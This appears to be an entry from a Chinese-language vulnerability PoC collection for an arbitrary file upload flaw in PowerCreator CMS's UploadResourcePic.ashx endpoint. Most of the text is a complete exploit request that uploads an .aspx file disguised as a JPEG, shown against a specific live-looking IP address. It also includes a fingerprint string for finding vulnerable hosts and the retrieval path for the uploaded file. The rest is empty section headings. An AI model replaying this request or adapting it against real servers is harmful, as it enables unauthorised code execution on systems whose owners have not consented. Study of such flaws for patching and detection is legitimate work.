# PowerCreatorCMSUploadResourcePic存在任意文件上传漏洞

- **系统**：PowerCreatorCMSUploadResourcePic　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`"PowerCreator-CMS"`
- **请求**：`POST /upload/UploadResourcePic.ashx?ResourceID=8382 HTTP/1.1`
- **关键头**：`Host: 111.207.14.183:88`　`Content-Length: 246`　`Content-Disposition: form-data;name="file1";filename="poc.aspx";`　`Content-Type: multipart/form-data; boundary=---------------------------208…`

**请求体 / payload**
```
-----------------------------20873900192357278038549710136
Content-Disposition: form-data; name="file1"; filename="poc.aspx"
Content-Type: image/jpeg
2etjJQglyub8ePXc0iTQlzBZk8t
-----------------------------20873900192357278038549710136--

文件上传位置
GET /ResourcePic/ODM4Mg==.ASPX HTTP/1.1
Host:
```

**其他**
- PowerCreator CMS UploadResourcePic存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * PowerCreator CMS